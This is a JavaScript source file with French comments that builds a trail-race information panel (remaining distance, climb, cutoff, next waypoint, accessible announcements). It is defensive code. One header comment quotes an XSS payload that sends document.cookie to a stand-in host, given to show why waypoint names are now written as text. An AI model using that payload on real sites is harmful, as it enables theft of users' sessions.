// Le Carnet de course — panneau droit de la barre course (course-bar.js).
//
// HIÉRARCHIE COUREUR (l'ordre compte, c'est tout le sujet du panneau) :
//   1. combien il reste          → LE gros chiffre, celui qu'on lit en
//                                  courant des yeux
//   2. dans combien de temps     → la durée restante D'APRÈS LA TRACE, en
//                                  micro-libellé dans la ligne de tête : une
//                                  soustraction d'horodatages, pas un ETA
//                                  personnel — voir dureeRestante()
//   3. ce qui reste à monter     → le D+ RESTANT (pas celui déjà avalé : on ne
//                                  redescend pas ce qu'on a monté)
//   4. LA BARRIÈRE HORAIRE       → sa propre rangée, à la taille des chiffres,
//                                  avec son ANCRAGE (« km 42 ») : c'est la
//                                  seule donnée du modèle qui puisse mettre
//                                  HORS COURSE, et une heure sans lieu ne
//                                  désigne rien. La teinte d'alerte ne
//                                  s'allume que si elle est au point suivant.
//   5. LE PROCHAIN POINT         → son nom, sa distance ET le D+ qui l'en
//                                  sépare (le couple décide de l'allure), ce
//                                  qu'on y trouve
//   6. le terrain à venir        → la BANDE de pente seule. Le chiffre de
//                                  pente a été supprimé : il disait pour la
//                                  quatrième fois ce que la bande, le profil
//                                  et le relief 3D montrent déjà — voir la
//                                  note en tête de carnet-course.css.
// ⚠️ ET L'ORDRE DU DOM SUIT CET ORDRE-LÀ. La bande de pente — rang 6 — était
// le DEUXIÈME enfant de .cc-body, donc au-dessus du chiffre héros et de toute
// la colonne : un coureur qui balaie le panneau de haut en bas rencontrait le
// terrain avant la distance restante, et l'arbre d'accessibilité disait la
// même chose que l'œil. Elle est descendue après le bloc principal, et
// phraseDuCarnet() a suivi (la pente y est désormais avant-dernière).
// Le point qu'on vient de QUITTER est la plus petite ligne du panneau (en
// tête, « depuis X ») : il ne règle plus rien. C'était l'inverse.
//
// ⚠️ LE DOM EST CONSTRUIT UNE FOIS, PUIS ÉCRIT PAR DIFFÉRENCE. La version
// d'avant faisait `el.innerHTML = …` à chaque appel — et l'appel vient de la
// tête de lecture, donc SOIXANTE FOIS PAR SECONDE. Conséquences vécues :
//   · toute sélection de texte, tout survol de title et surtout le curseur
//     virtuel d'un lecteur d'écran étaient invalidés en continu — le nœud sur
//     lequel il se pose disparaissait dans les 16 ms ;
//   · l'écriture innerHTML invalide la mise en page juste avant que
//     _drawProfile() ne relise cv.clientWidth et getComputedStyle() (gpx.js) :
//     recalcul de style synchrone forcé garanti à chaque image, pendant que la
//     scène 3D essaie de tenir 60 im/s.
// On ne réécrit donc qu'un textContent qui a CHANGÉ, et on ne reconstruit les
// deux seules parties structurelles (bande de pente, pictos) que quand leur
// signature bouge.
//
// ⚠️ ET PLUS AUCUN HTML INTERPOLÉ. Les noms de points viennent d'un
// <wpt><name> de GPX déposé ou du payload d'un lien /r/<id> — que n'importe
// qui peut publier (share-link.js : « anyone can POST to the publish
// endpoint »). Interpolés dans innerHTML, un point nommé
// `<img src=x onerror=fetch('//moi/'+document.cookie)>` s'exécutait dans le
// DOM de shibumap.com. textContent ne peut pas exécuter : c'est la seule
// parade qui ne s'oublie pas.
import './carnet-course.css'
import { PICTOS, LIBELLES_PICTOS, rangPicto } from '../race-labels.js'
import { textesDuCarnet, phraseDuCarnet, libelleFenetrePentes } from '../carnet-course.js'

// Trois pictos au maximum côte à côte. race-labels.js pose la même borne
// (.slice(0, 8)) pour la même raison : une rangée dont la longueur dépend des
// données passe à la ligne, et dans une boîte à hauteur fixe passer à la
// ligne veut dire se faire couper en deux.
const MAX_PICTOS = 3
// ⚠️ LE DÉBIT DE LA RÉGION LIVE EST CELUI D'UNE VOIX, PAS D'UNE HORLOGE.
// Il valait 1 200 ms — et la phrase produite par phraseDuCarnet() (« 12,4
// kilomètres restants, pente plus 5,2 pour cent, Refuge du Sotré dans 2,3 km ·
// +180 m, barrière horaire 12h30 ») demande six à dix secondes de synthèse
// vocale à débit normal. La file d'annonces ne se vidait donc JAMAIS :
// l'utilisateur n'entendait que des débuts de phrase, et surtout plus aucune
// autre annonce de la page ne pouvait passer (libellé du bouton Quitter, état
// Lecture/Pause…). Le commentaire d'alors présentait ce bridage comme la
// protection ; c'était le problème. 8 s = le temps réel d'une phrase.
const SR_MS = 8000

const el = (tag, cls, parent) => {
  const n = document.createElement(tag)
  if (cls) n.className = cls
  parent?.appendChild(n)
  return n
}

// `srNode` : la région live, CONSTRUITE PAR LA BARRE et pas ici.
// ⚠️ PIÈGE VÉCU : elle vivait dans .cc-body, donc DANS le corps repliable. Or
// le repli — une affordance purement visuelle, demande n°5 du client — pose
// `bodyEl.inert` (course-bar.js) et `visibility: hidden` (course-bar.css), et
// les deux retirent le sous-arbre de l'arbre d'accessibilité : replier la
// barre coupait TOUTES les annonces de course, sans qu'aucune autre voie ne
// les remplace, pendant qu'update() continuait d'écrire dans le nœud caché
// soixante fois par seconde. Un geste qui ne doit toucher que les pixels
// éteignait le seul canal non visuel de la fonctionnalité. Le nœud est en
// position absolue et clippé : sa place dans le flux n'a aucune importance,
// seule compte sa place dans l'ARBRE.
export function buildCarnetCourse({ container, srNode = null }) {
  const root = el('div', 'cc-body', container)

  // ---- 1. la tête : d'où je viens (petit), la durée d'après la trace, et le
  //         km parcouru (petit écran)
  const tete = el('div', 'cc-head', root)
  const nDepuis = el('span', 'cc-depuis', tete)
  // la seule réponse honnête à « dans combien de temps j'y arrive » que le
  // modèle permette : le temps que la TRACE a mis d'ici à l'arrivée. Micro,
  // atténué, dans la ligne la moins actionnable — c'est son rang, et il ne
  // coûte pas un pixel de hauteur (la ligne existait, sa droite était vide au
  // -dessus de 680 px depuis que .cc-km est masqué là).
  const nEta = el('span', 'cc-eta', tete)
  // ⚠️ MASQUÉ AU-DESSUS DE 680 px, ET C'EST VOULU : la pastille du profil, à
  // gauche, affiche déjà « 1240 m · km 12,4 » collée à la tête de lecture —
  // mieux placée que nous puisqu'elle est SUR la courbe. Sous 680 px le
  // profil disparaît (course-bar.css) : le km n'a plus d'autre porteur.
  const nKm = el('span', 'cc-km', tete)

  // ---- 2. le gros chiffre + la colonne de droite
  const main = el('div', 'cc-main', root)
  const hero = el('div', 'cc-hero', main)
  const nHero = el('span', 'cc-hero-val', hero)
  const nHeroTxt = document.createTextNode('')
  nHero.appendChild(nHeroTxt)
  const nHeroU = el('span', 'cc-hero-pct', nHero)
  nHeroU.textContent = 'km'
  const nHeroLbl = el('span', 'cc-hero-lbl', hero)
  nHeroLbl.textContent = 'restants'

  const side = el('div', 'cc-side', main)

  // ⚠️ LIBELLÉ, VALEUR ET UNITÉ SONT TROIS FRÈRES, PAS DEUX. L'unité vivait
  // DANS la valeur : les trois rangées étaient alors alignées par leur bord
  // DROIT (justify-content: space-between), c'est-à-dire par l'unité et pas
  // par le chiffre — « 2 380 m » et « 12h30 » posaient leurs derniers chiffres
  // à une quinzaine de pixels l'un de l'autre, et tout le travail de
  // tabular-nums était annulé par la mise en page. Sortie, l'unité devient la
  // troisième colonne d'une grille portée par .cc-side (carnet-course.css) :
  // les chiffres forment enfin une colonne, les unités aussi.
  //
  // ⚠️ ET LE LIBELLÉ A UN SUFFIXE ESCAMOTABLE. « SOMMET RESTANT » est le plus
  // large texte de la colonne (14 caractères en capitales espacées) dans un
  // panneau dont la largeur est la vraie contrainte — le CSS le révèle
  // exactement aux largeurs où son jumeau figé est visible dans la tête de
  // barre, et le range partout ailleurs. Voir le budget de LARGEUR en tête de
  // carnet-course.css.
  const duo = (libelle, { suffixe = '', cls = '' } = {}) => {
    const ligne = el('div', `cc-stat cc-stat-duo${cls ? ` ${cls}` : ''}`, side)
    const l = el('span', 'cc-l', ligne)
    l.textContent = libelle
    if (suffixe) el('span', 'cc-l-suf', l).textContent = ` ${suffixe}`
    const v = el('span', 'cc-v', ligne)
    const t = document.createTextNode('')
    v.appendChild(t)
    const u = el('span', 'cc-u', ligne)
    return { ligne, valeur: v, txt: t, unite: u }
  }
  // ⚠️ PLUS DE RANGÉE « PENTE » : elle disait pour la quatrième fois ce que la
  // bande juste au-dessus, le profil à gauche et le relief 3D disent déjà —
  // voir la note en tête de carnet-course.css. Sa place va à la barrière.
  const rDplus = duo('D+', { suffixe: 'restant', cls: 'cc-stat-dplus' })
  rDplus.unite.textContent = 'm'
  // LA BARRIÈRE HORAIRE, à son rang. Seule donnée du modèle qui puisse mettre
  // hors course, elle vivait en 11 px derrière un « · » dans la sous-ligne du
  // prochain point. Même palier que le D+ restant. Son « unité » n'en est pas
  // une : c'est son ANCRAGE (« km 42 »), parce qu'une heure qui ne désigne
  // aucun lieu n'est pas actionnable — et parce que la barrière affichée n'est
  // plus forcément celle du point suivant (voir prochaineBarriere()).
  // La teinte d'alerte est posée par update(), pas ici : elle dépend d'un ÉTAT.
  const rBarriere = duo('Barrière', { cls: 'cc-stat-barriere' })
  // Les lignes ci-dessous ne servent QUE quand il n'y a pas de prochain point
  // (trace sans <wpt>, ou dernier point franchi) : elles et le bloc « prochain
  // point » s'excluent. Entre elles, c'est le CSS qui tranche selon la largeur
  // — le sommet restant tant que le profil est là (sa pastille porte déjà
  // l'altitude courante), l'altitude courante quand il disparaît.
  // ⚠️ « SOMMET » TOUT COURT DISAIT LA MÊME CHOSE QUE LA TÊTE DE BARRE ET UN
  // AUTRE NOMBRE. La tête affiche `altMax` — le point culminant de TOUT le
  // parcours — sous le même libellé, à la même taille, dans la même barre :
  // au-dessus de 1101 px un coureur lisait « SOMMET 1840 m » à gauche et
  // « SOMMET 1450 m » à droite. C'est la répétition que la demande n°7
  // condamne, déplacée du titre vers les chiffres. Le suffixe « restant »
  // apparaît exactement là où le jumeau de la tête est visible (au-dessous, la
  // tête masque le sien : plus de collision, plus besoin du mot).
  const rSommet = duo('Sommet', { suffixe: 'restant', cls: 'cc-stat-sommet' })
  rSommet.unite.textContent = 'm'
  const rAlt = duo('Altitude', { cls: 'cc-stat-alt' })
  rAlt.unite.textContent = 'm'

  const suiv = el('div', 'cc-stat cc-next', side)
  const nSuivLbl = el('span', 'cc-l', suiv)
  nSuivLbl.textContent = 'Prochain point'
  const nSuivRang = el('div', 'cc-next-row', suiv)
  const nSuivNom = el('span', 'cc-name', nSuivRang)
  const nPictos = el('span', 'cc-pictos', nSuivRang)
  const nSuivSous = el('span', 'cc-next-sub', suiv)

  // ---- 3. la bande de pente à venir + son repère de portée — APRÈS le bloc
  //         principal : c'est son rang (voir l'en-tête de fichier)
  const bande = el('div', 'cc-slope-wrap', root)
  const nSlope = el('div', 'cc-slope', bande)
  nSlope.setAttribute('role', 'img')
  const nPortee = el('span', 'cc-portee', bande)

  // ---- 4. la région live, invisible à l'œil, bridée à une annonce/8 s.
  //         Elle vit DANS LA BARRE, pas dans le corps repliable — voir la note
  //         au-dessus de buildCarnetCourse. Le repli local reste un secours
  //         pour les appelants qui n'en fournissent pas.
  const nSr = srNode || el('p', 'cc-sr', root)
  nSr.setAttribute('role', 'status')
  nSr.setAttribute('aria-live', 'polite')

  // état précédent : on ne touche au DOM que sur différence
  const vu = {}
  const pose = (noeud, cle, valeur) => {
    if (vu[cle] === valeur) return
    vu[cle] = valeur
    noeud.textContent = valeur
  }
  const montre = (noeud, cle, visible) => {
    if (vu[cle] === visible) return
    vu[cle] = visible
    noeud.hidden = !visible
  }
  let srHorloge = 0

  function majBande(fenetre) {
    const segs = fenetre || []
    // signature : la longueur ET les classes. Reconstruire cinq <i> à chaque
    // image pour cinq classes qui ne changent qu'au passage d'un seuil serait
    // exactement le gâchis qu'on vient de supprimer.
    const sig = segs.map((s) => s.classe).join('|')
    if (vu.bandeSig === sig) return
    vu.bandeSig = sig
    while (nSlope.children.length > segs.length) nSlope.lastChild.remove()
    while (nSlope.children.length < segs.length) el('i', '', nSlope)
    segs.forEach((s, i) => { nSlope.children[i].dataset.classe = s.classe })
    nSlope.setAttribute('aria-label', libelleFenetrePentes(segs))
  }

  function majPictos(pictos) {
    const tous = pictos || []
    // ⚠️ TRIÉ PAR IMPORTANCE, PAS PAR ORDRE DE SAISIE. `suivant.pictos` arrive
    // dans l'ordre où l'organisateur a cliqué (ui/studio.js pousse au fil de
    // l'eau, sans jamais trier) : borné à trois, on pouvait annoncer « WC,
    // point de vue, col » et taire le poste de secours et l'eau. ORDRE_PICTOS
    // (race-labels.js) est la source unique de cet ordre.
    // Coût : un tri sur SIX entrées au maximum, et seulement quand la
    // signature change — pas à chaque image.
    const liste = tous.length > 1
      ? [...tous].sort((a, b) => rangPicto(a.picto) - rangPicto(b.picto)).slice(0, MAX_PICTOS)
      : tous.slice(0, MAX_PICTOS)
    const reste = tous.length - liste.length
    const sig = `${liste.map((p) => `${p.picto}${p.loin ? '~' : ''}${p.km ?? ''}`).join('|')}+${reste}`
    if (vu.pictoSig === sig) return
    vu.pictoSig = sig
    nPictos.textContent = ''
    for (const p of liste) {
      const n = el('span', 'cc-picto', nPictos)
      // ⚠️ GARDE DE PROPRIÉTÉ PROPRE, pas un `|| ''`. La clé vient d'un fichier
      // tiers (parseRace() force les pictos en chaînes mais n'en valide pas le
      // contenu) et Object.freeze ne coupe pas la chaîne de prototypes : un
      // `pictos: ["constructor"]` rendait une FONCTION, truthy, donc un
      // innerHTML « function Object() { [native code] } » et un lecteur
      // d'écran qui énonce du code natif. Non exploitable — aucun métacaractère
      // HTML dans ces sources — mais le commentaire ci-dessous jurait qu'une
      // clé inconnue reste muette : elle ne l'était pas.
      const connu = Object.hasOwn(PICTOS, p.picto) && Object.hasOwn(LIBELLES_PICTOS, p.picto)
      // ⚠️ le libellé accessible est un MOT FRANÇAIS, pas la clé interne.
      // « ravito », « dodo », « wc » lus par un lecteur d'écran ne veulent
      // rien dire. Une clé inconnue rend une chaîne vide plutôt que d'être
      // recopiée : le picto reste alors muet, jamais bavard de travers.
      const mot = connu ? LIBELLES_PICTOS[p.picto] : ''
      // ⚠️ ET « LOIN » SE DIT, il ne se voit pas seulement. Le drapeau n'avait
      // AUCUN équivalent textuel : l'aria-label était le même mot (« Point
      // d'eau ») de près comme de loin, et la sous-ligne ne le disait pas non
      // plus. Un utilisateur de lecteur d'écran n'apprenait jamais que le point
      // est encore loin — c'est-à-dire la seule chose que le drapeau encode.
      // ⚠️ ET UN PICTO EMPRUNTÉ DIT OÙ IL EST. pictosDuCarnet() ajoute le
      // premier point de RAVITAILLEMENT devant quand le point suivant n'en
      // porte aucun (« le prochain point qui a de l'eau », pas « l'eau du
      // prochain point ») : sans son kilomètre, ce picto mentirait en se
      // faisant passer pour un service du point affiché juste à côté.
      const dit = mot
        ? (Number.isFinite(p.km) ? `${mot}, km ${Math.round(p.km)}` : (p.loin ? `${mot}, plus loin` : mot))
        : ''
      n.setAttribute('role', 'img')
      n.setAttribute('aria-label', dit)
      n.title = dit
      if (p.loin) n.dataset.loin = '1'
      // PICTOS est un dictionnaire de constantes du dépôt, pas une donnée
      // tierce : c'est le SEUL innerHTML qui reste ici, et il ne voit jamais
      // une chaîne venue d'un GPX ou d'un lien partagé. Écrit en `if` et pas
      // en ternaire pour que la ligne reste littéralement `PICTOS[…]` — le
      // test qui verrouille cet endroit lit la SOURCE (test/course-bar.js ne
      // peut pas importer ce module, il tire une .css).
      if (connu) n.innerHTML = PICTOS[p.picto]
    }
    // la troncature devient VISIBLE : sans ce « +n », rien ne disait au coureur
    // qu'il manque quelque chose au prochain point (même gabarit de 16 px,
    // donc aucun coût sur le budget de hauteur)
    if (reste > 0) {
      const n = el('span', 'cc-picto cc-picto-plus', nPictos)
      n.setAttribute('role', 'img')
      const dit = `${reste} autre${reste > 1 ? 's' : ''} service${reste > 1 ? 's' : ''}`
      n.setAttribute('aria-label', dit)
      n.title = dit
      n.textContent = `+${reste}`
    }
    nPictos.hidden = liste.length === 0
  }

  function update(c) {
    const t = textesDuCarnet(c)
    if (!t) {
      if (vu.vide) return
      vu.vide = true
      root.hidden = true
      return
    }
    if (vu.vide !== false) { vu.vide = false; root.hidden = false }

    pose(nDepuis, 'depuis', t.depuis)
    montre(nDepuis, 'depuisOn', !!t.depuis)
    pose(nEta, 'duree', t.duree)
    montre(nEta, 'dureeOn', !!t.duree)
    pose(nKm, 'km', t.km)
    pose(nPortee, 'portee', t.portee)
    majBande(c.fenetrePentes)

    pose(nHeroTxt, 'restant', t.restant)
    pose(rDplus.txt, 'dplus', t.dplusRestant)
    pose(rBarriere.txt, 'barriere', t.barriere)
    pose(rBarriere.unite, 'barriereOu', t.barriereOu)
    pose(rAlt.txt, 'alt', t.alt)
    pose(rSommet.txt, 'sommet', t.sommet)

    // ⚠️ LA TEINTE D'ALERTE EST UN ÉTAT, ET ELLE SE POSE ICI. Elle vivait en
    // dur dans la feuille (.cc-v-limite ajoutée une fois à la construction) :
    // le chiffre était rouge dès qu'un cutoff existait, c'est-à-dire toujours
    // et partout pour une course qui en a. Un rouge qui est toujours rouge
    // n'est pas une alerte, c'est une couleur de rangée — et c'était la SEULE
    // teinte sémantique du panneau, dépensée sur un état qui ne variait pas.
    // Deux états, deux rendus : encre pleine quand la barrière est plus loin
    // sur le parcours, alerte quand elle est au point IMMÉDIATEMENT suivant.
    if (vu.barriereChaude !== t.barriereImminente) {
      vu.barriereChaude = t.barriereImminente
      rBarriere.valeur.classList.toggle('cc-v-limite', t.barriereImminente)
    }

    montre(suiv, 'suivOn', t.aSuivant)
    // la barrière n'occupe une rangée que s'il y en a une : même mécanique que
    // les deux lignes d'altitude. Le budget de hauteur reste juste parce que
    // .cc-side est ancrée à la hauteur du PIRE cas (carnet-course.css) : la
    // colonne ne se recentre plus quand une rangée apparaît ou disparaît.
    montre(rBarriere.ligne, 'barriereOn', t.aBarriere)
    montre(rAlt.ligne, 'altOn', !t.aSuivant)
    montre(rSommet.ligne, 'sommetOn', !t.aSuivant && t.aSommet)
    if (t.aSuivant) {
      pose(nSuivNom, 'nom', t.prochainNom)
      pose(nSuivSous, 'sous', t.prochainSous)
      majPictos(c.pictos)
    }

    // ⚠️ ON N'ANNONCE QUE CE QUI A CHANGÉ. Réécrire nSr avec la MÊME phrase
    // relance quand même l'annonce : un nœud texte remplacé par un texte
    // identique est une mutation pour la région live. À 0,5×, la phrase
    // arrondie est souvent identique d'un tick au suivant — on répétait donc
    // mot pour mot, indéfiniment. La phrase n'est recomposée que si l'annonce
    // est due (sinon on paierait un formatage complet par image pour une
    // chaîne jetée aussitôt), et n'est POSÉE que si elle diffère.
    // Le changement de prochain point court-circuite l'horloge : c'est le seul
    // évènement qui mérite d'interrompre une annonce en cours.
    const maintenant = Date.now()
    if (maintenant - srHorloge >= SR_MS || vu.srNom !== t.prochainNom) {
      srHorloge = maintenant
      vu.srNom = t.prochainNom
      const p = phraseDuCarnet(c)
      if (p !== vu.srPhrase) {
        vu.srPhrase = p
        nSr.textContent = p
      }
    }
  }

  return { update, dispose: () => root.remove(), _el: root }
}
